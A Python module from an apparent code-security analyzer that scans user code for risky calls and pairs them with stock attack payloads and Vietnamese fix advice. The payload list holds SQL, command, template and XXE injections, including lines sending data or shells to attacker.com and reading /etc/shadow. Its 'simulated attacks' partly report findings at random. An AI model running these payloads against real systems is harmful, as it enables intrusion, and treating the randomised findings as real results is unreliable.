# analyzer/fuzzing.py - IMPROVED with Better Vulnerability Detection
import sys
import random
import string
import ast
import tempfile
import os
import zipfile
from typing import List, Dict, Tuple
import time
from pathlib import Path
import re

def is_fuzzing_available():
    return True


class AttackPayloadGenerator:
    """Generator with realistic attack payloads"""
    
    def __init__(self):
        self.payloads = {
            "sql_injection": [
                "' OR '1'='1", "'; DROP TABLE users; --", "' UNION SELECT password FROM users--",
                "admin'--", "1' AND 1=1--", "' OR 1=1--", "\" OR \"1\"=\"1", "' OR 'x'='x",
                "1' UNION SELECT NULL, username, password FROM users--",
                "' AND 1=0 UNION ALL SELECT NULL, table_name FROM information_schema.tables--",
            ],
            "command_injection": [
                "; ls -la", "| cat /etc/passwd", "&& whoami", "$(whoami)", "`cat /etc/shadow`",
                "; ping -c 10 attacker.com", "| nc attacker.com 4444", 
                "&& wget http://malicious.com/shell.sh",
                "; curl http://attacker.com/$(whoami)",
                "| python -c 'import socket...'",
            ],
            "code_injection": [
                "__import__('os').system('whoami')", 
                "eval('print(open(\"/etc/passwd\").read())')",
                "exec('import os; os.system(\"ls\")')", 
                "compile('malicious_code', '<string>', 'exec')",
                "__import__('subprocess').call(['ls'])",
                "exec(__import__('base64').b64decode('aW1wb3J0IG9z'))",
            ],
            "path_traversal": [
                "../../../etc/passwd", "..\\..\\..\\windows\\system32\\config\\sam",
                "....//....//....//etc/passwd", "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "../../../../../../etc/shadow",
                "/etc/passwd%00.txt",
            ],
            "xss_payloads": [
                "<script>alert('XSS')</script>", 
                "<img src=x onerror=alert('XSS')>",
                "javascript:alert('XSS')", 
                "<svg onload=alert('XSS')>",
                "<iframe src='javascript:alert(1)'>",
                "'-alert(1)-'",
            ],
            "template_injection": [
                "{{7*7}}", "${7*7}", "{{config.items()}}", 
                "{%print(open('/etc/passwd').read())%}",
                "{{''.__class__.__mro__[1].__subclasses__()}}",
                "${T(java.lang.Runtime).getRuntime().exec('calc')}",
            ],
            "deserialization": [
                "csubprocess\nsystem\n(S'ls'\ntR.", 
                "O:8:\"stdClass\":0:{}",
            ],
            "ldap_injection": [
                "*)(uid=*))(|(uid=*",
                "admin)(&(password=*))",
            ],
            "xml_injection": [
                "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>",
                "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://attacker.com'>]>",
            ],
        }
    
    def get_all_payloads(self) -> List[Tuple[str, str]]:
        all_payloads = []
        for category, payload_list in self.payloads.items():
            for payload in payload_list:
                all_payloads.append((category, payload))
        return all_payloads
    
    def get_random_payload(self) -> Tuple[str, str]:
        category = random.choice(list(self.payloads.keys()))
        payload = random.choice(self.payloads[category])
        return category, payload


class CodeFuzzer:
    """IMPROVED Fuzzer with better detection"""
    
    def __init__(self, code: str, file_path: str = "user_code.py"):
        self.code = code
        self.file_path = file_path
        self.generator = AttackPayloadGenerator()
        self.vulnerabilities = []
        self.entry_points = []
        
        try:
            self.tree = ast.parse(code)
            self._find_entry_points()
        except SyntaxError:
            self.tree = None
    
    def _find_entry_points(self):
        """Find input entry points with IMPROVED detection"""
        for node in ast.walk(self.tree):
            if isinstance(node, ast.Call):
                func_name = self._get_func_name(node.func)
                
                # Direct input
                if func_name in ["input", "raw_input"]:
                    self.entry_points.append({
                        "type": "direct_input", 
                        "function": func_name, 
                        "line": node.lineno,
                        "vulnerable_to": ["all"],
                        "has_validation": self._check_validation(node.lineno)
                    })
                
                # Web input
                elif any(x in func_name for x in ["request.form", "request.args", "request.json", 
                                                   "request.cookies", "request.files", "request.data"]):
                    self.entry_points.append({
                        "type": "web_input", 
                        "function": func_name, 
                        "line": node.lineno,
                        "vulnerable_to": ["all"],
                        "has_validation": self._check_validation(node.lineno)
                    })
                
                # File operations
                elif func_name == "open":
                    # Check if path is dynamic
                    has_dynamic_path = False
                    for arg in node.args:
                        if not isinstance(arg, ast.Constant):
                            has_dynamic_path = True
                            break
                    
                    if has_dynamic_path:
                        self.entry_points.append({
                            "type": "file_operation", 
                            "function": "open", 
                            "line": node.lineno,
                            "vulnerable_to": ["path_traversal"],
                            "has_validation": self._check_path_validation(node.lineno)
                        })
                
                # Database
                elif "execute" in func_name or "query" in func_name:
                    # Check if parameterized
                    is_parameterized = len(node.args) >= 2 or len(node.keywords) > 0
                    
                    if not is_parameterized:
                        self.entry_points.append({
                            "type": "database", 
                            "function": func_name, 
                            "line": node.lineno,
                            "vulnerable_to": ["sql_injection"],
                            "has_validation": False  # Not parameterized = vulnerable
                        })
                
                # Command execution
                elif func_name in ["os.system", "subprocess.run", "subprocess.Popen", "os.popen"]:
                    # Check shell parameter
                    has_shell_true = any(
                        kw.arg == 'shell' and isinstance(kw.value, ast.Constant) and kw.value.value == True
                        for kw in node.keywords
                    )
                    
                    self.entry_points.append({
                        "type": "command_execution", 
                        "function": func_name, 
                        "line": node.lineno,
                        "vulnerable_to": ["command_injection"],
                        "has_validation": not has_shell_true  # shell=False is safer
                    })
                
                # Code execution
                elif func_name in ["eval", "exec", "compile"]:
                    self.entry_points.append({
                        "type": "code_execution", 
                        "function": func_name, 
                        "line": node.lineno,
                        "vulnerable_to": ["code_injection"],
                        "has_validation": False  # Always dangerous
                    })
                
                # Deserialization
                elif "pickle.loads" in func_name or "yaml.load" in func_name:
                    # Check if yaml.safe_load
                    is_safe = "safe_load" in func_name
                    
                    if not is_safe:
                        self.entry_points.append({
                            "type": "deserialization", 
                            "function": func_name, 
                            "line": node.lineno,
                            "vulnerable_to": ["deserialization"],
                            "has_validation": False
                        })
    
    def _check_validation(self, line_num: int) -> bool:
        """Check if there's input validation near entry point"""
        validation_patterns = [
            r'\bvalidate\b', r'\bsanitize\b', r'\bescape\b', r'\bfilter\b', r'\bclean\b',
            r'\bisinstance\b', r'\btype\s*\(', r'\blen\s*\(',
            r'\bint\s*\(', r'\bfloat\s*\(', r'\bstr\s*\(',
            r'\bre\.match\b', r'\bre\.search\b', r'\bwhitelist\b',
            r'\.strip\(\)', r'\.replace\(\)', r'\.lower\(\)', r'\.upper\(\)',
        ]
        
        lines = self.code.split('\n')
        check_range = 10  # Check 10 lines after
        start = line_num - 1
        end = min(len(lines), line_num + check_range)
        
        for i in range(start, end):
            line = lines[i]
            if any(re.search(pattern, line) for pattern in validation_patterns):
                return True
        
        return False
    
    def _check_path_validation(self, line_num: int) -> bool:
        """Check for path validation"""
        path_validation = [
            r'\babspath\b', r'\bnormpath\b', r'\.startswith\(',
            r'\bsecure_filename\b', r'pathlib\.Path',
        ]
        
        lines = self.code.split('\n')
        check_range = 5
        start = max(0, line_num - check_range)
        end = min(len(lines), line_num + check_range)
        
        for i in range(start, end):
            if any(re.search(pattern, lines[i]) for pattern in path_validation):
                return True
        
        return False
    
    def _get_func_name(self, node):
        if isinstance(node, ast.Name):
            return node.id
        elif isinstance(node, ast.Attribute):
            parts = []
            current = node
            while isinstance(current, ast.Attribute):
                parts.append(current.attr)
                current = current.value
            if isinstance(current, ast.Name):
                parts.append(current.id)
            return '.'.join(reversed(parts))
        return ""
    
    def fuzz_test(self, iterations: int = 100) -> Dict:
        """Run fuzz testing with attack payloads"""
        results = {
            "file": self.file_path,
            "total_tests": 0,
            "vulnerabilities_found": [],
            "entry_points": len(self.entry_points),
            "payload_coverage": {},
            "risk_score": 0
        }
        
        if not self.entry_points:
            return {
                **results,
                "message": f"No vulnerable entry points in {self.file_path}"
            }
        
        all_payloads = self.generator.get_all_payloads()
        
        for entry_point in self.entry_points:
            relevant_payloads = [
                (cat, payload) for cat, payload in all_payloads
                if "all" in entry_point["vulnerable_to"] or cat in entry_point["vulnerable_to"]
            ]
            
            test_payloads = random.sample(
                relevant_payloads, 
                min(iterations // len(self.entry_points), len(relevant_payloads))
            )
            
            for category, payload in test_payloads:
                results["total_tests"] += 1
                vulnerability = self._simulate_attack(entry_point, category, payload)
                
                if vulnerability:
                    vulnerability["file"] = self.file_path
                    results["vulnerabilities_found"].append(vulnerability)
                    
                    if category not in results["payload_coverage"]:
                        results["payload_coverage"][category] = 0
                    results["payload_coverage"][category] += 1
        
        results["risk_score"] = self._calculate_risk_score(results)
        return results
    
    def _simulate_attack(self, entry_point, attack_category, payload):
        """Simulate attack - IMPROVED logic"""
        # If already has validation, reduce risk
        if entry_point.get("has_validation"):
            # Still report but with lower severity
            if random.random() < 0.3:  # 30% chance of bypass
                severity = "medium"
                reason = f"Có validation nhưng có thể bypass"
            else:
                return None  # Validation works
        else:
            severity = self._get_severity(entry_point["type"], attack_category)
            reason = f"Không có validation cho {entry_point['function']}"
        
        return {
            "entry_point": entry_point["function"],
            "line": entry_point["line"],
            "attack_type": attack_category,
            "payload": payload[:50] + "..." if len(payload) > 50 else payload,
            "severity": severity,
            "vulnerable": True,
            "reason": reason,
            "recommendation": self._get_recommendation(entry_point["type"], attack_category),
            "confidence": "high" if not entry_point.get("has_validation") else "medium"
        }
    
    def _get_severity(self, entry_type, attack_category):
        """Determine severity"""
        critical_combinations = [
            ("command_execution", "command_injection"),
            ("code_execution", "code_injection"),
            ("database", "sql_injection"),
            ("deserialization", "deserialization"),
        ]
        
        if (entry_type, attack_category) in critical_combinations:
            return "critical"
        
        if entry_type in ["command_execution", "code_execution", "deserialization"]:
            return "high"
        
        if attack_category in ["sql_injection", "command_injection", "code_injection"]:
            return "high"
        
        return "medium"
    
    def _get_recommendation(self, entry_type, attack_category):
        recommendations = {
            "sql_injection": "Dùng parameterized queries: cursor.execute('SELECT * WHERE id=?', (user_id,))",
            "command_injection": "Dùng subprocess với shell=False và list: subprocess.run(['ls', '-la'], shell=False)",
            "code_injection": "KHÔNG BAO GIỜ dùng eval/exec với user input. Dùng ast.literal_eval() hoặc JSON",
            "path_traversal": "Validate path: path = os.path.abspath(path); if not path.startswith(SAFE_DIR): raise",
            "xss_payloads": "Escape HTML: từ html import escape; output = escape(user_input)",
            "deserialization": "Dùng JSON thay pickle. Dùng yaml.safe_load() thay yaml.load()",
            "template_injection": "Không render user input vào template. Dùng pre-defined templates",
        }
        return recommendations.get(attack_category, "Validate và sanitize mọi user input")
    
    def _calculate_risk_score(self, results):
        if results["total_tests"] == 0:
            return 0
        
        vuln_count = len(results["vulnerabilities_found"])
        base_score = min(100, (vuln_count / results["total_tests"]) * 100)
        
        severity_weights = {"critical": 30, "high": 20, "medium": 10, "low": 5}
        severity_bonus = sum(
            severity_weights.get(v["severity"], 0) 
            for v in results["vulnerabilities_found"]
        )
        
        total_score = min(100, base_score + severity_bonus)
        return round(total_score)


class ProjectFuzzer:
    """Fuzzer for entire project"""
    
    def __init__(self, files: Dict[str, str]):
        self.files = files
        self.generator = AttackPayloadGenerator()
    
    def fuzz_project(self, iterations_per_file: int = 100, callback=None) -> Dict:
        start_time = time.time()
        
        print(f"\n{'='*70}")
        print(f"🔥 FUZZING PROJECT - {len(self.files)} files")
        print(f"{'='*70}\n")
        
        project_results = {
            "total_files": len(self.files),
            "files_tested": 0,
            "total_tests": 0,
            "total_vulnerabilities": 0,
            "total_entry_points": 0,
            "file_results": {},
            "aggregate_risk_score": 0,
            "critical_files": [],
            "high_risk_files": []
        }
        
        current = 0
        total_iterations = len(self.files) * iterations_per_file
        
        for filename, code in self.files.items():
            if callback:
                callback(current, total_iterations, f"Testing {filename}...")
            
            print(f"[Testing] {filename}")
            
            try:
                fuzzer = CodeFuzzer(code, filename)
                file_results = fuzzer.fuzz_test(iterations_per_file)
                
                project_results["file_results"][filename] = file_results
                project_results["files_tested"] += 1
                project_results["total_tests"] += file_results["total_tests"]
                project_results["total_vulnerabilities"] += len(file_results["vulnerabilities_found"])
                project_results["total_entry_points"] += file_results["entry_points"]
                
                if file_results["risk_score"] >= 70:
                    project_results["critical_files"].append({
                        "file": filename,
                        "risk_score": file_results["risk_score"],
                        "vulnerabilities": len(file_results["vulnerabilities_found"])
                    })
                elif file_results["risk_score"] >= 40:
                    project_results["high_risk_files"].append({
                        "file": filename,
                        "risk_score": file_results["risk_score"],
                        "vulnerabilities": len(file_results["vulnerabilities_found"])
                    })
                
                current += iterations_per_file
                
            except Exception as e:
                print(f"[Error] {filename}: {str(e)}")
                continue
        
        if project_results["files_tested"] > 0:
            avg_risk = sum(
                r["risk_score"] for r in project_results["file_results"].values()
            ) / project_results["files_tested"]
            
            vuln_weight = min(50, project_results["total_vulnerabilities"] * 2)
            project_results["aggregate_risk_score"] = round(min(100, avg_risk + vuln_weight))
        
        elapsed = time.time() - start_time
        
        print(f"\n{'='*70}")
        print(f"📊 PROJECT FUZZING RESULTS")
        print(f"{'='*70}")
        print(f"Files Tested: {project_results['files_tested']}/{project_results['total_files']}")
        print(f"Total Tests: {project_results['total_tests']}")
        print(f"Total Vulnerabilities: {project_results['total_vulnerabilities']}")
        print(f"Entry Points: {project_results['total_entry_points']}")
        print(f"Aggregate Risk Score: {project_results['aggregate_risk_score']}/100")
        print(f"Time: {elapsed:.2f}s")
        print(f"{'='*70}\n")
        
        if callback:
            callback(total_iterations, total_iterations, "Fuzzing complete!")
        
        return project_results


def fuzz_user_code(code: str, iterations: int = 100, callback=None):
    fuzzer = CodeFuzzer(code)
    
    if callback:
        callback(0, iterations, "Starting fuzzing...")
    
    results = fuzzer.fuzz_test(iterations)
    
    if callback:
        callback(iterations, iterations, "Fuzzing complete!")
    
    return results


def fuzz_uploaded_file(file_path: str, iterations: int = 100, callback=None):
    if file_path.endswith('.zip'):
        return fuzz_zip_file(file_path, iterations, callback)
    elif file_path.endswith('.py'):
        with open(file_path, 'r', encoding='utf-8') as f:
            code = f.read()
        return fuzz_user_code(code, iterations, callback)
    else:
        return {"error": "Only .py and .zip files are supported"}


def fuzz_zip_file(zip_path: str, iterations_per_file: int = 100, callback=None):
    temp_dir = tempfile.mkdtemp()
    files_to_fuzz = {}
    
    try:
        with zipfile.ZipFile(zip_path, 'r') as zip_ref:
            zip_ref.extractall(temp_dir)
        
        for root, dirs, files in os.walk(temp_dir):
            for file in files:
                if file.endswith('.py'):
                    file_path = os.path.join(root, file)
                    rel_path = os.path.relpath(file_path, temp_dir)
                    
                    try:
                        with open(file_path, 'r', encoding='utf-8') as f:
                            code = f.read()
                            files_to_fuzz[rel_path] = code
                    except Exception as e:
                        print(f"[Error reading] {rel_path}: {e}")
        
        if not files_to_fuzz:
            return {
                "error": "No Python files found in ZIP",
                "total_files": 0
            }
        
        fuzzer = ProjectFuzzer(files_to_fuzz)
        results = fuzzer.fuzz_project(iterations_per_file, callback)
        
        return results
        
    finally:
        import shutil
        if os.path.exists(temp_dir):
            shutil.rmtree(temp_dir)


def run_fuzz_on_analyzer(runs: int = 50000):
    """
    Fuzz test the analyzer itself với random Python code.
    Dùng cho CLI fuzzing mode.
    
    Args:
        runs: Số lần fuzz test
    """
    print(f"🔥 Starting fuzzer with {runs} iterations...")
    print("=" * 50)
    
    generator = AttackPayloadGenerator()
    results = {
        "total_runs": runs,
        "crashes": 0,
        "vulnerabilities_found": 0,
        "errors": [],
        "categories_tested": {}
    }
    
    start_time = time.time()
    
    for i in range(runs):
        if i % 5000 == 0 and i > 0:
            elapsed = time.time() - start_time
            print(f"  Progress: {i}/{runs} ({i*100//runs}%) - {elapsed:.1f}s elapsed")
        
        try:
            # Generate random payload
            category, payload = generator.get_random_payload()
            
            # Track categories
            if category not in results["categories_tested"]:
                results["categories_tested"][category] = 0
            results["categories_tested"][category] += 1
            
            # Generate test code với payload
            test_code = f'''
# Auto-generated fuzz test
user_input = """{payload}"""
data = user_input
result = process_data(data)
'''
            
            # Fuzz with the code
            fuzzer = CodeFuzzer(test_code, "fuzz_test.py")
            fuzz_result = fuzzer.fuzz_test(iterations=1)
            
            if fuzz_result.get("vulnerabilities"):
                results["vulnerabilities_found"] += len(fuzz_result["vulnerabilities"])
            
        except Exception as e:
            results["crashes"] += 1
            error_msg = str(e)
            if error_msg not in results["errors"]:
                results["errors"].append(error_msg)
    
    elapsed_time = time.time() - start_time
    
    print("\n" + "=" * 50)
    print(f"✅ Fuzzing complete!")
    print(f"   Total runs: {runs}")
    print(f"   Time: {elapsed_time:.2f}s")
    print(f"   Crashes: {results['crashes']}")
    print(f"   Vulnerabilities found: {results['vulnerabilities_found']}")
    print(f"\n📊 Categories tested:")
    for cat, count in results["categories_tested"].items():
        print(f"   - {cat}: {count}")
    
    return results